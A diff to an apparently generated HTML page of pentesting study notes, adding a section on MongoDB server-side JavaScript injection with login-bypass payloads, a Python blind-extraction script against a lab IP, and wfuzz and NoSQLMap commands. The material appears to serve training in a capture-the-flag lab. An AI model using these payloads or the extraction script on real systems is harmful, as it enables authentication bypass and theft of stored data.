@@ -1856,6 +1856,84 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#server-side-javascript-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server-Side JavaScript Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Server-Side JavaScript Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#automating-server-side-javascript-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automating Server-Side JavaScript Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools-of-the-trade" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools of the Trade
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools of the Trade">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wordlists
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wfuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        wfuzz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nosqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NoSQLMap
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2266,6 +2344,84 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#server-side-javascript-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server-Side JavaScript Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Server-Side JavaScript Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#automating-server-side-javascript-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automating Server-Side JavaScript Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools-of-the-trade" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools of the Trade
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools of the Trade">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wordlists
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wfuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        wfuzz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nosqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NoSQLMap
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2591,6 +2747,184 @@
 </span><span id="__span-6-30">
 </span><span id="__span-6-31"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Tracking Number: &quot;</span> <span class="o">+</span> <span class="n">trackingNum</span><span class="p">)</span>
 </span></code></pre></div></td></tr></table></div>
+<h3 id="server-side-javascript-injection">Server-Side JavaScript Injection</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="c1"># example backend script where javascript is used inside mongo query</span>
+</span><span id="__span-7-2">db.users.find<span class="o">({</span><span class="nv">$where</span>:<span class="w"> </span><span class="s2">&quot;this.username == \&quot;&quot;</span><span class="w"> </span>+<span class="w"> </span>req.body<span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; &amp;&amp; this.password == \&quot;&quot;</span><span class="w"> </span>+<span class="w"> </span>req.body<span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot;&quot;</span><span class="o">})</span><span class="p">;</span>
+</span><span id="__span-7-3">
+</span><span id="__span-7-4"><span class="c1"># basic bypass</span>
+</span><span id="__span-7-5"><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;+||+true+||+&quot;&quot;==&quot;</span><span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span><span class="nb">test</span>
+</span><span id="__span-7-6">
+</span><span id="__span-7-7"><span class="c1"># bypass for finding specific user incrementally</span>
+</span><span id="__span-7-8"><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;+||+(this.username.match(&#39;^H.*&#39;))+||+&quot;&quot;==&quot;</span><span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span><span class="nb">test</span>
+</span><span id="__span-7-9"><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;+||+(this.username.match(&#39;^HT.*&#39;))+||+&quot;&quot;==&quot;</span><span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span><span class="nb">test</span>
+</span><span id="__span-7-10"><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;+||+(this.username.match(&#39;^HTB.*&#39;))+||+&quot;&quot;==&quot;</span><span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span><span class="nb">test</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="automating-server-side-javascript-injection">Automating Server-Side JavaScript Injection</h4>
+<div class="language-py highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><span class="ch">#!/usr/bin/python3</span>
+</span><span id="__span-8-2">
+</span><span id="__span-8-3"><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-8-4"><span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote_plus</span>
+</span><span id="__span-8-5">
+</span><span id="__span-8-6"><span class="c1"># Oracle (answers True or False)</span>
+</span><span id="__span-8-7"><span class="n">num_req</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span id="__span-8-8"><span class="k">def</span><span class="w"> </span><span class="nf">oracle</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+</span><span id="__span-8-9">    <span class="k">global</span> <span class="n">num_req</span>
+</span><span id="__span-8-10">    <span class="n">num_req</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span id="__span-8-11">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span><span id="__span-8-12">        <span class="s2">&quot;http://154.57.164.78:31105/index.php&quot;</span><span class="p">,</span>
+</span><span id="__span-8-13">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">},</span>
+</span><span id="__span-8-14">        <span class="n">data</span><span class="o">=</span><span class="s2">&quot;username=</span><span class="si">%s</span><span class="s2">&amp;password=x&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">quote_plus</span><span class="p">(</span><span class="s1">&#39;&quot; || (&#39;</span> <span class="o">+</span> <span class="n">r</span> <span class="o">+</span> <span class="s1">&#39;) || &quot;&quot;==&quot;&#39;</span><span class="p">))</span>
+</span><span id="__span-8-15">    <span class="p">)</span>
+</span><span id="__span-8-16">    <span class="k">return</span> <span class="s2">&quot;Logged in as&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+</span><span id="__span-8-17">
+</span><span id="__span-8-18"><span class="c1"># Ensure the oracle is working correctly</span>
+</span><span id="__span-8-19"><span class="k">assert</span> <span class="p">(</span><span class="n">oracle</span><span class="p">(</span><span class="s1">&#39;false&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="kc">False</span><span class="p">)</span>
+</span><span id="__span-8-20"><span class="k">assert</span> <span class="p">(</span><span class="n">oracle</span><span class="p">(</span><span class="s1">&#39;true&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-8-21">
+</span><span id="__span-8-22"><span class="c1"># Dump the username (&#39;regular&#39; search)</span>
+</span><span id="__span-8-23"><span class="n">num_req</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># Set the request counter to 0</span>
+</span><span id="__span-8-24"><span class="n">username</span> <span class="o">=</span> <span class="s2">&quot;HTB{&quot;</span> <span class="c1"># Known beginning of username</span>
+</span><span id="__span-8-25"><span class="n">i</span> <span class="o">=</span> <span class="mi">4</span> <span class="c1"># Set i to 4 to skip the first 4 chars (HTB{)</span>
+</span><span id="__span-8-26"><span class="k">while</span> <span class="n">username</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;}&quot;</span><span class="p">:</span> <span class="c1"># Repeat until we dump &#39;}&#39; (known end of username)</span>
+</span><span id="__span-8-27">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span> <span class="c1"># Loop through all printable ASCII chars</span>
+</span><span id="__span-8-28">        <span class="k">if</span> <span class="n">oracle</span><span class="p">(</span><span class="s1">&#39;this.username.startsWith(&quot;HTB{&quot;) &amp;&amp; this.username.charCodeAt(</span><span class="si">%d</span><span class="s1">) == </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">c</span><span class="p">)):</span>
+</span><span id="__span-8-29">            <span class="n">username</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="c1"># Append current char to the username if it expression evaluates as True</span>
+</span><span id="__span-8-30">            <span class="k">break</span> <span class="c1"># And break the loop</span>
+</span><span id="__span-8-31">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span> <span class="c1"># Increment the index counter</span>
+</span><span id="__span-8-32"><span class="k">assert</span> <span class="p">(</span><span class="n">oracle</span><span class="p">(</span><span class="s1">&#39;this.username == `</span><span class="si">%s</span><span class="s1">`&#39;</span> <span class="o">%</span> <span class="n">username</span><span class="p">)</span> <span class="o">==</span> <span class="kc">True</span><span class="p">)</span> <span class="c1"># Verify the username</span>
+</span><span id="__span-8-33"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;---- Regular search ----&quot;</span><span class="p">)</span>
+</span><span id="__span-8-34"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Username: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">username</span><span class="p">)</span>
+</span><span id="__span-8-35"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Requests: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">num_req</span><span class="p">)</span>
+</span><span id="__span-8-36"><span class="nb">print</span><span class="p">()</span>
+</span><span id="__span-8-37">
+</span><span id="__span-8-38"><span class="c1"># Dump the username (binary search)</span>
+</span><span id="__span-8-39"><span class="n">num_req</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1"># Reset the request counter</span>
+</span><span id="__span-8-40"><span class="n">username</span> <span class="o">=</span> <span class="s2">&quot;HTB{&quot;</span> <span class="c1"># Known beginning of username</span>
+</span><span id="__span-8-41"><span class="n">i</span> <span class="o">=</span> <span class="mi">4</span> <span class="c1"># Skip the first 4 characters (HTB{)</span>
+</span><span id="__span-8-42"><span class="k">while</span> <span class="n">username</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;}&quot;</span><span class="p">:</span> <span class="c1"># Repeat until we meet &#39;}&#39; aka end of username</span>
+</span><span id="__span-8-43">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span> <span class="c1"># Set low value of search area (&#39; &#39;)</span>
+</span><span id="__span-8-44">    <span class="n">high</span> <span class="o">=</span> <span class="mi">127</span> <span class="c1"># Set high value of search area (&#39;~&#39;)</span>
+</span><span id="__span-8-45">    <span class="n">mid</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span id="__span-8-46">    <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;=</span> <span class="n">high</span><span class="p">:</span>
+</span><span id="__span-8-47">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">high</span> <span class="o">+</span> <span class="n">low</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span> <span class="c1"># Caluclate the midpoint of the search area</span>
+</span><span id="__span-8-48">        <span class="k">if</span> <span class="n">oracle</span><span class="p">(</span><span class="s1">&#39;this.username.startsWith(&quot;HTB{&quot;) &amp;&amp; this.username.charCodeAt(</span><span class="si">%d</span><span class="s1">) &gt; </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)):</span>
+</span><span id="__span-8-49">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span> <span class="c1"># If ASCII value of username at index &#39;i&#39; &lt; midpoint, increase the lower boundary and repeat</span>
+</span><span id="__span-8-50">        <span class="k">elif</span> <span class="n">oracle</span><span class="p">(</span><span class="s1">&#39;this.username.startsWith(&quot;HTB{&quot;) &amp;&amp; this.username.charCodeAt(</span><span class="si">%d</span><span class="s1">) &lt; </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)):</span>
+</span><span id="__span-8-51">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span> <span class="c1"># If ASCII value of username at index &#39;i&#39; &gt; midpoint, decrease the upper boundary and repeat</span>
+</span><span id="__span-8-52">        <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-8-53">            <span class="n">username</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span> <span class="c1"># If ASCII value is neither higher or lower than the midpoint we found the target value</span>
+</span><span id="__span-8-54">            <span class="k">break</span> <span class="c1"># Break out of the loop</span>
+</span><span id="__span-8-55">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span> <span class="c1"># Increment the index counter (start work on the next character)</span>
+</span><span id="__span-8-56"><span class="k">assert</span> <span class="p">(</span><span class="n">oracle</span><span class="p">(</span><span class="s1">&#39;this.username == `</span><span class="si">%s</span><span class="s1">`&#39;</span> <span class="o">%</span> <span class="n">username</span><span class="p">)</span> <span class="o">==</span> <span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-8-57"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;---- Binary search ----&quot;</span><span class="p">)</span>
+</span><span id="__span-8-58"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Username: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">username</span><span class="p">)</span>
+</span><span id="__span-8-59"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Requests: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">num_req</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="tools-of-the-trade">Tools of the Trade</h3>
+<h4 id="wordlists">Wordlists</h4>
+<ul>
+<li><a href="https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt">nosqlinjection_wordlists/mongodb_nosqli.txt</a></li>
+</ul>
+<h4 id="wfuzz"><a href="https://github.com/xmendez/wfuzz">wfuzz</a></h4>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1">wfuzz<span class="w"> </span>-z<span class="w"> </span>file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt<span class="w"> </span>-u<span class="w"> </span>http://127.0.0.1/index.php<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;trackingNum&quot;: FUZZ}&#39;</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="nosqlmap"><a href="https://github.com/codingo/NoSQLMap">NoSQLMap</a></h4>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><span class="c1"># install </span>
+</span><span id="__span-10-2">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/codingo/NoSQLMap.git
+</span><span id="__span-10-3"><span class="nb">cd</span><span class="w"> </span>NoSQLMap
+</span><span id="__span-10-4">sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>python2.7
+</span><span id="__span-10-5">wget<span class="w"> </span>https://bootstrap.pypa.io/pip/2.7/get-pip.py
+</span><span id="__span-10-6">python2<span class="w"> </span>get-pip.py
+</span><span id="__span-10-7">pip2<span class="w"> </span>install<span class="w"> </span>couchdb
+</span><span id="__span-10-8">pip2<span class="w"> </span>install<span class="w"> </span>--upgrade<span class="w"> </span>setuptools
+</span><span id="__span-10-9">pip2<span class="w"> </span>install<span class="w"> </span>pbkdf2
+</span><span id="__span-10-10">pip2<span class="w"> </span>install<span class="w"> </span>pymongo
+</span><span id="__span-10-11">pip2<span class="w"> </span>install<span class="w"> </span>ipcalc
+</span><span id="__span-10-12">
+</span><span id="__span-10-13"><span class="c1"># example: testing if email and/or password field are vulnerable</span>
+</span><span id="__span-10-14">python2<span class="w"> </span>nosqlmap.py<span class="w"> </span>--attack<span class="w"> </span><span class="m">2</span><span class="w"> </span>--victim<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>--webPort<span class="w"> </span><span class="m">80</span><span class="w"> </span>--uri<span class="w"> </span>/index.php<span class="w"> </span>--httpMethod<span class="w"> </span>POST<span class="w"> </span>--postData<span class="w"> </span>email,admin@mangomail.com,password,qwerty<span class="w"> </span>--injectedParameter<span class="w"> </span><span class="m">1</span><span class="w"> </span>--injectSize<span class="w"> </span><span class="m">4</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>NOTE</strong> burp has a NoSQLi scanner extention <a href="https://github.com/matrix/Burp-NoSQLiScanner">Burp-NoSQLiScanner</a></p>
 
 
 
